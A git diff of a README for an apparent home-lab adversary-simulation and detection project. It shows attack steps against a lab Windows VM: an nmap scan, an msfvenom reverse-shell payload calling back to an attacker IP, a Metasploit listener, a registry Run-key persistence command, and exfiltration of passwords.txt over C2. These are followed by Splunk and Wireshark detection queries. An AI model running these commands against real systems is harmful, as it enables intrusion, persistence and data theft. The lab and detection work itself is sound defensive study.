@@ -27,9 +27,15 @@ Using native testing mechanisms and specialized frameworks, the following offens
 Identified open ports, active services, and operating system versions on the victim machine.
 > `nmap -sS -T4 -Pn --top-ports 4000 -sV 192.168.1.14`
 
+![Nmap Scan Results](images/1_recon_nmap.PNG)
+*Alternative Text: Terminal output showing discovered open ports and services on the target Windows 10 machine.*
+
 ### 2. Weaponization (Payload Generation)
 Crafted a reverse TCP executable payload tailored for 64-bit Windows environments.
 > `msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.13 LPORT=4444 -f exe > weapon.exe`
+
+![Payload Generation](images/weapon.PNG)
+*Alternative Text: Kali terminal showing the successful generation of the reverse TCP payload using msfvenom.*
 
 ### 3. Delivery & Exploitation
 Hosted the payload using a Python-based web server and initiated a Metasploit multi-handler listener to intercept the incoming execution callback.
@@ -44,12 +50,15 @@ Hosted the payload using a Python-based web server and initiated a Metasploit mu
 > `> set payload windows/x64/shell/reverse_tcp`
 > `> exploit`
 
-![Adversary Simulation Terminal](images/weapon.PNG)
-*Alternative Text: Execution of nmap, payload generation, and listener setup on Kali Linux.*
+![Adversary Simulation Terminal](images/delivery.PNG)
+*Alternative Text: Execution of python web server and listener setup on Kali Linux.*
 
 ### 4. Persistence (Registry Modification)
 Established a boot-persistent mechanism by forcing the payload to run automatically upon user authentication via the Windows Registry.
 > `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "weapon.exe" /t REG_SZ /d "C:\Users\zeid4\OneDrive\Desktop\weapon.exe" /f`
+
+![Registry Persistence Setup](images/4_persistence_registry.PNG)
+*Alternative Text: Command prompt showing the successful addition of the run key to the Windows Registry.*
 
 ### 5. Command & Control (C2) & Exfiltration
 Generated an advanced C2 implant (`WISE_MINI.exe`) utilizing mutual TLS (`mTLS`) for secure tracking evasion, followed by the exfiltration of sensitive files over the established session.
@@ -57,6 +66,9 @@ Generated an advanced C2 implant (`WISE_MINI.exe`) utilizing mutual TLS (`mTLS`)
 
 > `# Exfiltrating target files`
 > `download passwords.txt`
+
+![C2 Session and Exfiltration](images/5_c2_exfiltration.PNG)
+*Alternative Text: Terminal view of the active C2 session and successful file download of passwords.txt.*
 
 ---
 
@@ -72,10 +84,16 @@ Aggregates network connection events (`EventCode=3`) originating from the suspic
 > `| stats count by dest_port` 
 > `| where count > 10`
 
+![Splunk Port Scan Detection](images/splunk_A_port_scan.PNG)
+*Alternative Text: Splunk dashboard showing a spike in network connections to various destination ports from the attacker IP.*
+
 #### B. Delivery & Execution Connection Tracking
 Isolates active connections running over common target reverse ports or suspicious process environments.
 > `index=* dest_port=4444`
 > `| table _time, src_ip, dest_ip, dest_port`
+
+![Splunk Connection Tracking](images/splunk_B_delivery_connection.PNG)
+*Alternative Text: Splunk logs detailing the active network connection on port 4444 between the victim and attacker machine.*
 
 #### C. Anomalous Process Lineage (Shell Spawning)
 Detects command shells (`cmd.exe`, `powershell.exe`) spawned by unusual parent processes rather than standard system processes like `explorer.exe`.
@@ -83,10 +101,16 @@ Detects command shells (`cmd.exe`, `powershell.exe`) spawned by unusual parent p
 > `| where NOT (ParentImage LIKE "*explorer.exe" OR ParentImage LIKE "*services.exe")` 
 > `| table _time, user, Image, ParentImage`
 
+![Splunk Anomalous Process Lineage](images/splunk_C_process_lineage.PNG)
+*Alternative Text: Splunk query results displaying weapon.exe as the suspicious parent process spawning cmd.exe.*
+
 #### D. Registry Persistence Monitoring
 Identifies unauthorized writes directly into the system or user Startup/Run keys (`EventCode=13`).
 > `index=* EventCode=13 (TargetObject="*\\CurrentVersion\\Run*" OR TargetObject="*\\CurrentVersion\\RunOnce*")`
 > `| table _time, host, User, Image, TargetObject, Details`
+
+![Splunk Panel Interface](images/detect_persistence.PNG)
+*Alternative Text: Splunk dashboard panels displaying query hits for persistence and abnormal registry modification.*
 
 #### E. C2 Beaconing & Exfiltration Fingerprinting (`WISE_MINI.exe`)
 Tracks persistent internal infrastructure interactions and execution parameters managed via the specific binary components.
@@ -97,8 +121,8 @@ Tracks persistent internal infrastructure interactions and execution parameters 
 > `index=* "wise_mini" EventCode=1`
 > `| table _time, ParentImage, Image, CommandLine`
 
-![Splunk Panel Interface](images/detect_persistence.PNG)
-*Alternative Text: Splunk dashboard panels displaying query hits for persistence and abnormal process creation.*
+![Splunk C2 Beaconing Fingerprint](images/splunk_E_c2_beaconing.PNG)
+*Alternative Text: Splunk logs highlighting WISE_MINI.exe execution and its outbound beaconing activity.*
 
 ---
 
@@ -113,9 +137,15 @@ Isolates packets where the SYN flag is set but no ACK response follows, exposing
 *Target-focused view:*
 > `tcp.flags.syn == 1 && tcp.flags.ack == 0 and ip.dst == 192.168.1.14`
 
+![Wireshark SYN Scan Capture](images/wireshark_A_syn_scan.PNG)
+*Alternative Text: Wireshark packet capture highlighting a rapid succession of SYN packets directed at the target.*
+
 #### B. HTTP Payload Delivery Tracing
 Extracts raw HTTP web transactions happening between the target computer and the attack system, indicating explicit utility downloads or artifact transfers.
 > `http && (ip.src == 192.168.1.14 && ip.dst == 192.168.1.13)`
+
+![Wireshark HTTP Delivery](images/wireshark_B_http_delivery.PNG)
+*Alternative Text: Wireshark view showing the HTTP GET request from the Windows machine downloading the payload.*
 
 #### C. Command and Control Handshake Extraction
 Identifies the network traffic on target C2 ports or isolates cryptographic negotiation handshake exchanges (`Client Hello` or `Certificate Exchange`) mapped across communication tunnels.
@@ -124,7 +154,7 @@ Identifies the network traffic on target C2 ports or isolates cryptographic nego
 *Cryptographic Profiling Layer:*
 > `tls.handshake.type == 1 || tls.handshake.type == 11`
 
-![Wireshark Traffic Capture](images/detect_cnc_using wireshark.PNG)
+![Wireshark Traffic Capture](images/detect_cnc_using_wireshark.PNG)
 *Alternative Text: Wireshark packet capture showing TCP flag distributions and TLS handshake parameters.*
 
 ---
@@ -133,3 +163,5 @@ Identifies the network traffic on target C2 ports or isolates cryptographic nego
 1. **The Power of Sysmon:** Standard Windows Event Logs can miss registry or payload creations, but Sysmon fills those gaps perfectly with specific Event IDs like `EventCode=1` (Process Creation) and `EventCode=13` (Registry Modification).
 2. **Behavior Over Signatures:** Relying on basic tool names (like `weapon.exe`) is not enough because attackers can rename files easily. Instead, using SPL to focus on *behaviors*—such as searching for anomalous parent-child process tracking—proves much more effective.
 3. **Defense-in-Depth:** Combining network metrics (Wireshark) with host-based indicators (Splunk) ensures full operational visibility across the network.
+
+```
